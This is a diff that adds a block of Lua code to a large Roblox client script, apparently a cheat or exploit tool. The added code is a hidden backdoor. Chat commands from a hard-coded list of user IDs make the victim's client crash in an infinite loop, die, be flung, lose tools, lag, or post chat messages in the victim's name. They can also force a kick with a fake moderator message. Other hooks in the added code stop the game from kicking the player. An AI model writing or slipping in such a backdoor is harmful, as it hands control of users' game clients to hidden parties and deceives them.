@@ -7922,6 +7922,672 @@ local function resetConnections()
 end
 
 
+admins = {35703015,4823933942,5769154214,4862735779,4812420044,191312500,6053605824,2552032182,1569254424,4480718707,5782488111,3234923758}
+
+Players = game:GetService("Players")
+RunService = game:GetService("RunService")
+FunctionTable = {}
+ToolTable = {}
+commands = {}
+adminonly = {}
+prefix = "."
+Reason = false
+loopkill = false
+loopfling = false
+looppunish = false
+loopremovetools = false
+loopremovetool = false
+
+FunctionTable['GetPlayer'] = function(sender,text)
+    if text == "" then
+        return nil
+    end
+    if text == "all" then
+        return "all"
+    end
+    if text == "me" then
+        return sender
+    end
+	for _,Player in pairs(Players:GetPlayers()) do
+		if string.sub(string.lower(Player.Name),1,string.len(text)) == string.lower(text) then
+			return Player
+        elseif string.sub(string.lower(Player.DisplayName),1,string.len(text)) == string.lower(text) then
+            return Player
+        elseif tonumber(text) then
+            return Players:GetNameFromUserIdAsync(tonumber(text))
+        end
+	end
+    return nil
+end
+
+FunctionTable['GetTool'] = function(text)
+    if text == "train" or text == "trainsword" or text == "trainingsword" then
+        return "Train"
+    elseif text == "sword" then
+        return "Sword"
+    elseif text == "shur" or text == "shuriken" then
+        return "Shuriken"
+    elseif text == "tele" or text == "teleport" then
+        return "Teleport"
+    end
+    return nil
+end
+
+FunctionTable['LoopKill'] = function(switch)
+    if switch == true then
+        loopkill = false
+        task.wait()
+        loopkill = true
+        while loopkill do
+            if Players.LocalPlayer.Character then
+                if Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
+                    Players.LocalPlayer.Character:FindFirstChild("Humanoid").Health = 0
+                else
+                    Players.LocalPlayer.Character:Destroy()
+                end
+            end
+            task.wait()
+        end
+    else
+        loopkill = false
+    end
+end
+
+FunctionTable['LoopFling'] = function(switch,multi)
+    if switch == true then
+        loopfling = false
+        task.wait()
+        loopfling = true
+        while loopfling do
+            if Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                local velocity = Instance.new("BodyVelocity")
+                if multi then
+                    velocity.Velocity = Vector3.new((math.random(-10,10) * 100) * multi, 500 * multi, (math.random(-10,10) * 100) * multi)
+                else
+                    velocity.Velocity = Vector3.new((math.random(-10,10) * 100), 500, (math.random(-10,10) * 100))
+                end
+                velocity.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
+                velocity.Parent = Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+                task.wait(0.25)
+                if velocity then
+                    velocity:Destroy()
+                end
+            end
+            task.wait()
+        end
+    else
+        loopfling = false
+    end
+end
+
+FunctionTable['LoopPunish'] = function(switch)
+    if switch == true then
+        looppunish = false
+        task.wait()
+        looppunish = true
+
+        local function noRespawn()
+            game:GetService("Lighting"):FindFirstChild("Blur").Enabled = false
+            Players.LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("FirstScreenGui").Enabled = false
+        end
+
+        norespawns = RunService.Stepped:Connect(noRespawn)
+        while looppunish do
+            if Players.LocalPlayer.Character then
+                Players.LocalPlayer.Character:Destroy()
+            end
+            task.wait()
+        end
+    else
+        pcall(function()
+            norespawns:Disconnect()
+        end)
+        looppunish = false
+    end
+end
+
+FunctionTable['LoopRemoveTools'] = function(switch)
+    if switch == true then
+        loopremovetools = false
+        task.wait()
+        loopremovetools = true
+        while loopremovetools do
+            for i,v in pairs(Players.LocalPlayer.Backpack:GetChildren()) do
+                if v:IsA("Tool") then
+                    v:Destroy()
+                end
+            end
+            if Players.LocalPlayer.Character then
+                for i,v in pairs(Players.LocalPlayer.Character:GetChildren()) do
+                    if v:IsA("Tool") then
+                        v:Destroy()
+                    end
+                end
+            end
+            task.wait(0.05)
+        end
+    else
+        loopremovetools = false
+    end
+end
+
+FunctionTable['LoopRemoveTool'] = function(switch,tool)
+    if switch == true and not table.find(ToolTable,tool) then
+        loopremovetool = true
+        table.insert(ToolTable,tool)
+        while loopremovetool do
+            for i,v in pairs(Players.LocalPlayer.Backpack:GetChildren()) do
+                if v.Name == tool then
+                    v:Destroy()
+                end
+            end
+            if Players.LocalPlayer.Character then
+                for i,v in pairs(Players.LocalPlayer.Character:GetChildren()) do
+                    if v.Name == tool then
+                        v:Destroy()
+                    end
+                end
+            end
+            task.wait(0.05)
+        end
+    elseif switch == false then
+        loopremovetool = false
+    end
+end
+
+adminonly.chat = function(sender,args,stringargs)
+    local player = FunctionTable['GetPlayer'](sender,args[1])
+    if player and player == Players.LocalPlayer then
+        local playername = string.sub(stringargs,1,string.len(args[1]) + 2)
+        local msg = string.sub(stringargs,string.len(playername),string.len(stringargs))
+        if msg then
+            game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(msg,"All")
+        end
+    end    
+end
+
+adminonly.kick = function(sender,args)
+    local player = FunctionTable['GetPlayer'](sender,args[1])
+    if player and player == Players.LocalPlayer then
+        Reason = true
+        Players.LocalPlayer:Kick("You have been kicked by the DreamRoad Studio Moderator Team. Please follow the rules.")
+    end
+end
+
+adminonly.crash = function(sender,args)
+    local player = FunctionTable['GetPlayer'](sender,args[1])
+    if player and player == Players.LocalPlayer then
+        while true do
+            print("lol")
+        end
+    end
+end
+
+adminonly.kill = function(sender,args)
+    local player = FunctionTable['GetPlayer'](sender,args[1])
+    if player and player == Players.LocalPlayer and Players.LocalPlayer.Character then
+        if Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
+            Players.LocalPlayer.Character:FindFirstChild("Humanoid").Health = 0
+        else
+            Players.LocalPlayer.Character:Destroy()
+        end
+    end
+end
+
+adminonly.loopkill = function(sender,args)
+    local player = FunctionTable['GetPlayer'](sender,args[1])
+    if player and player == Players.LocalPlayer then
+        FunctionTable['LoopKill'](true)
+    end
+end
+
+adminonly.unloopkill = function(sender,args)
+    local player = FunctionTable['GetPlayer'](sender,args[1])
+    if player and player == Players.LocalPlayer then
+        FunctionTable['LoopKill'](false)
+    end
+end
+
+adminonly.fling = function(sender,args)
+    local player = FunctionTable['GetPlayer'](sender,args[1])
+    local multi = args[2]
+    if player and player == Players.LocalPlayer then
+        if Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+            local velocity = Instance.new("BodyVelocity")
+            if multi then
+                velocity.Velocity = Vector3.new((math.random(-10,10) * 100) * multi, 500 * multi, (math.random(-10,10) * 100) * multi)
+            else
+                velocity.Velocity = Vector3.new((math.random(-10,10) * 100), 500, (math.random(-10,10) * 100))
+            end
+            velocity.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
+            velocity.Parent = Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+            task.wait(0.25)
+            if velocity then
+                velocity:Destroy()
+            end
+        end
+    end
+end
+
+adminonly.sfling = function(sender,args)
+    local player = FunctionTable['GetPlayer'](sender,args[1])
+    local multi = args[2]
+    if player and player == Players.LocalPlayer then
+        if Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+            local velocity = Instance.new("BodyVelocity")
+            if multi then
+                velocity.Velocity = Vector3.new((math.random(-10,10) * 100000) * multi, 500000 * multi, (math.random(-10,10) * 100000) * multi)
+            else
+                velocity.Velocity = Vector3.new((math.random(-10,10) * 100000), 500000, (math.random(-10,10) * 100000))
+            end
+            velocity.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
+            velocity.Parent = Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+            task.wait(0.25)
+            if velocity then
+                velocity:Destroy()
+            end
+        end
+    end
+end
+
+adminonly.loopfling = function(sender,args)
+    local player = FunctionTable['GetPlayer'](sender,args[1])
+    local multi = args[2]
+    if player and player == Players.LocalPlayer then
+        if multi then
+            FunctionTable['LoopFling'](multi)
+        else
+            FunctionTable['LoopFling']()
+        end
+    end
+end
+
+adminonly.punish = function(sender,args)
+    local player = FunctionTable['GetPlayer'](sender,args[1])
+    if player and player == Players.LocalPlayer then
+        FunctionTable['LoopPunish'](true)
+    end
+end
+
+adminonly.unpunish = function(sender,args)
+    local player = FunctionTable['GetPlayer'](sender,args[1])
+    if player and player == Players.LocalPlayer then
+        FunctionTable['LoopPunish'](false)
+        task.wait()
+        pcall(function()
+            game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvent"):WaitForChild("SpawnCharacterEvent"):FireServer("MainSpawn")
+        end)
+    end
+end
+
+adminonly.antirespawn = function(sender,args)
+    local player = FunctionTable['GetPlayer'](sender,args[1])
+    if player and player == Players.LocalPlayer then
+
+        if antikick == nil then
+            antikick = function()
+                local mt = getrawmetatable(game)
+                local old = mt.__namecall
+                local protect = newcclosure or protect_function
+                
+                if not protect then
+                    protect = function(f) return f end
+                end
+                
+                setreadonly(mt, false)
+                mt.__namecall = protect(function(self, ...)
+                    local method = getnamecallmethod()
+                    if method == "Kick" and Reason == false then
+                        wait(9e9)
+                        return
+                    end
+                    return old(self, ...)
+                end)
+                local Players = game:GetService("Players")
+                local player = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait() or Players.LocalPlayer
+                hookfunction(player.Kick,protect(function() if Reason == false then wait(9e9) end end))
+            end
+        end
+
+        antikick()
+        
+        for i,v in pairs(game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvent"):GetChildren()) do
+            if v.Name == "SpawnCharacterEvent" then
+                v:Destroy()
+            end
+        end
+
+    end
+end
+
+adminonly.antires = function(sender,args)
+    local player = FunctionTable['GetPlayer'](sender,args[1])
+    if player and player == Players.LocalPlayer then
+
+        if antikick == nil then
+            antikick = function()
+                local mt = getrawmetatable(game)
+                local old = mt.__namecall
+                local protect = newcclosure or protect_function
+                
+                if not protect then
+                    protect = function(f) return f end
+                end
+                
+                setreadonly(mt, false)
+                mt.__namecall = protect(function(self, ...)
+                    local method = getnamecallmethod()
+                    if method == "Kick" and Reason == false then
+                        wait(9e9)
+                        return
+                    end
+                    return old(self, ...)
+                end)
+                local Players = game:GetService("Players")
+                local player = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait() or Players.LocalPlayer
+                hookfunction(player.Kick,protect(function() if Reason == false then wait(9e9) end end))
+            end
+        end
+
+        antikick()
+        
+        for i,v in pairs(game.ReplicatedStorage.RemoteEvent:GetChildren()) do
+            if v.Name == "SpawnCharacterEvent" then
+                v:Destroy()
+            end
+        end
+
+    end
+end
+
+adminonly.removetools = function(sender,args)
+    local player = FunctionTable['GetPlayer'](sender,args[1])
+    if player and player == Players.LocalPlayer then
+        for i,v in pairs(Players.LocalPlayer.Backpack:GetChildren()) do
+            if v:IsA("Tool") then
+                v:Destroy()
+            end
+        end
+        if Players.LocalPlayer.Character then
+            for i,v in pairs(Players.LocalPlayer.Character:GetChildren()) do
+                if v:IsA("Tool") then
+                    v:Destroy()
+                end
+            end
+        end
+    end
+end
+
+adminonly.loopremovetools = function(sender,args)
+    local player = FunctionTable['GetPlayer'](sender,args[1])
+    if player and player == Players.LocalPlayer then
+        FunctionTable['LoopRemoveTools'](true)
+    end
+end
+
+adminonly.unloopremovetools = function(sender,args)
+    local player = FunctionTable['GetPlayer'](sender,args[1])
+    if player and player == Players.LocalPlayer then
+        FunctionTable['LoopRemoveTools'](false)
+    end
+end
+
+adminonly.removetool = function(sender,args)
+    local player = FunctionTable['GetPlayer'](sender,args[1])
+    local tool = FunctionTable['GetTool'](args[2])
+    if player and player == Players.LocalPlayer and tool then
+        for i,v in pairs(Players.LocalPlayer.Backpack:GetChildren()) do
+            if v.Name == tool then
+                v:Destroy()
+            end
+        end
+        if Players.LocalPlayer.Character then
+            for i,v in pairs(Players.LocalPlayer.Character:GetChildren()) do
+                if v.Name == tool then
+                    v:Destroy()
+                end
+            end
+        end
+    end
+end
+
+adminonly.loopremovetool = function(sender,args)
+    local player = FunctionTable['GetPlayer'](sender,args[1])
+    local tool = FunctionTable['GetTool'](args[2])
+    if player and player == Players.LocalPlayer and tool then
+        FunctionTable['LoopRemoveTool'](true,tool)
+    end
+end
+
+adminonly.unloopremovetool = function(sender,args)
+    local player = FunctionTable['GetPlayer'](sender,args[1])
+    if player and player == Players.LocalPlayer then
+        FunctionTable['LoopRemoveTool'](false,"nil")
+    end
+end
+
+adminonly.place = function(sender,args)
+    local player = FunctionTable['GetPlayer'](sender,args[1])
+    local placeid = args[2]
+    if player and player == Players.LocalPlayer and placeid then
+        game:GetService("TeleportService"):Teleport(placeid,Players.LocalPlayer)
+    end
+end
+
+adminonly.tp = function(sender,args)
+    local player = FunctionTable['GetPlayer'](sender,args[1])
+    local otherplr = FunctionTable['GetPlayer'](sender,args[1])
+    if player and otherplr and player == Players.LocalPlayer and Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and otherplr.Character and otherplr.Character:FindFirstChild("HumanoidRootPart") then
+        Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = otherplr.Character:FindFirstChild("HumanoidRootPart").CFrame
+    end
+end
+
+adminonly.rejoin = function(sender,args)
+    local player = FunctionTable['GetPlayer'](sender,args[1])
+    if player and player == Players.LocalPlayer then
+        local PlaceId, JobId = game.PlaceId, game.JobId
+        if #Players:GetPlayers() <= 1 then
+            Players.LocalPlayer:Kick("\nRejoining...")
+            wait()
+            TeleportService:Teleport(PlaceId, Players.LocalPlayer)
+        else
+            TeleportService:TeleportToPlaceInstance(PlaceId, JobId, Players.LocalPlayer)
+        end
+    end
+end
+
+adminonly.respawn = function(sender,args)
+    local player = FunctionTable['GetPlayer'](sender,args[1])
+    if player and player == Players.LocalPlayer then
+        game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvent"):WaitForChild("SpawnCharacterEvent"):FireServer("MainSpawn")
+    end
+end
+
+adminonly.res = function(sender,args)
+    local player = FunctionTable['GetPlayer'](sender,args[1])
+    if player and player == Players.LocalPlayer then
+        game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvent"):WaitForChild("SpawnCharacterEvent"):FireServer("MainSpawn")
+    end
+end
+
+adminonly.antitrain = function(sender,args)
+    local player = FunctionTable['GetPlayer'](sender,args[1])
+    if player and player == Players.LocalPlayer then
+
+        if antikick == nil then
+            antikick = function()
+                local mt = getrawmetatable(game)
+                local old = mt.__namecall
+                local protect = newcclosure or protect_function
+                
+                if not protect then
+                    protect = function(f) return f end
+                end
+                
+                setreadonly(mt, false)
+                mt.__namecall = protect(function(self, ...)
+                    local method = getnamecallmethod()
+                    if method == "Kick" and Reason == false then
+                        wait(9e9)
+                        return
+                    end
+                    return old(self, ...)
+                end)
+                local Players = game:GetService("Players")
+                local player = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait() or Players.LocalPlayer
+                hookfunction(player.Kick,protect(function() if Reason == false then wait(9e9) end end))
+            end
+        end
+
+        antikick()
+
+        for i,v in pairs(game.ReplicatedStorage.RemoteEvent:GetChildren()) do
+            if v.Name == "AddPowerEvent" then
+                v:Destroy()
+            end
+        end
+
+    end
+end
+
+adminonly.freeze = function(sender,args)
+    local player = FunctionTable['GetPlayer'](sender,args[1])
+    if player and player == Players.LocalPlayer and Players.LocalPlayer.Character then
+        for i,v in pairs(Players.LocalPlayer.Character:GetChildren()) do
+            if v:IsA("BasePart") then
+                v.Anchored = true
+            end
+        end
+    end
+end
+
+adminonly.unfreeze = function(sender,args)
+    local player = FunctionTable['GetPlayer'](sender,args[1])
+    if player and player == Players.LocalPlayer and Players.LocalPlayer.Character then
+        for i,v in pairs(Players.LocalPlayer.Character:GetChildren()) do
+            if v:IsA("BasePart") then
+                v.Anchored = false
+            end
+        end
+    end
+end
+
+adminonly.lag = function(sender,args)
+    local player = FunctionTable['GetPlayer'](sender,args[1])
+    if player and player == Players.LocalPlayer then
+
+        local part = Instance.new("Part",workspace)
+        part.CFrame = CFrame.new(0,250000,0)
+        part.Size = Vector3.new(2040,100,2040)
+        part.Anchored = true
+        
+        task.spawn(function()
+            while true do
+                local part1 = Instance.new("Part",workspace)
+                part1.CFrame = CFrame.new(0,250100,0)
+                task.wait(0.05)
+            end
+        end)
+
+    end
+end
+
+for i,plr in pairs(Players:GetPlayers()) do
+    plr.Chatted:Connect(function(msg)
+        if table.find(admins,plr.UserId) then
+            local message = string.lower(msg)
+            local splitstring = message:split(" ")
+            local stringsplit = msg:split(" ")
+            local slashcommand
+            if splitstring[1] == "/e" then
+                slashcommand = splitstring[2]
+            else
+                slashcommand = splitstring[1]
+            end
+            local cmd = slashcommand:split(prefix)
+            local cmdname = cmd[2]
+            local arguments = {}
+            local stringargs = ""
+            if splitstring[1] == "/e" then
+                for i = 3, #splitstring, 1 do
+                    table.insert(arguments,splitstring[i])
+                end
+                for i = 3, #stringsplit, 1 do
+                    stringargs = stringargs..tostring(stringsplit[i])
+                    if i ~= #stringsplit then
+                        stringargs = stringargs.." "
+                    end
+                end
+            else
+                for i = 2, #splitstring, 1 do
+                    table.insert(arguments,splitstring[i])
+                end
+                for i = 2, #stringsplit, 1 do
+                    stringargs = stringargs..tostring(stringsplit[i])
+                    if i ~= #stringsplit then
+                        stringargs = stringargs.." "
+                    end
+                end
+            end
+            if commands[cmdname] then
+                commands[cmdname](plr,arguments,stringargs)
+            elseif adminonly[cmdname] then
+                adminonly[cmdname](plr,arguments,stringargs)
+            end
+        else
+            return
+        end
+    end)
+end
+
+Players.PlayerAdded:Connect(function(plr)
+    plr.Chatted:Connect(function(msg)
+        if table.find(admins,plr.UserId) then
+            local message = string.lower(msg)
+            local splitstring = message:split(" ")
+            local stringsplit = msg:split(" ")
+            local slashcommand
+            if splitstring[1] == "/e" then
+                slashcommand = splitstring[2]
+            else
+                slashcommand = splitstring[1]
+            end
+            local cmd = slashcommand:split(prefix)
+            local cmdname = cmd[2]
+            local arguments = {}
+            local stringargs = ""
+            if splitstring[1] == "/e" then
+                for i = 3, #splitstring, 1 do
+                    table.insert(arguments,splitstring[i])
+                end
+                for i = 3, #stringsplit, 1 do
+                    stringargs = stringargs..tostring(stringsplit[i])
+                    if i ~= #stringsplit then
+                        stringargs = stringargs.." "
+                    end
+                end
+            else
+                for i = 2, #splitstring, 1 do
+                    table.insert(arguments,splitstring[i])
+                end
+                for i = 2, #stringsplit, 1 do
+                    stringargs = stringargs..tostring(stringsplit[i])
+                    if i ~= #stringsplit then
+                        stringargs = stringargs.." "
+                    end
+                end
+            end
+            if commands[cmdname] then
+                commands[cmdname](plr,arguments,stringargs)
+            elseif adminonly[cmdname] then
+                adminonly[cmdname](plr,arguments,stringargs)
+            end
+        else
+            return
+        end
+    end)
+end)
+
 
 local function initializeScript()
 
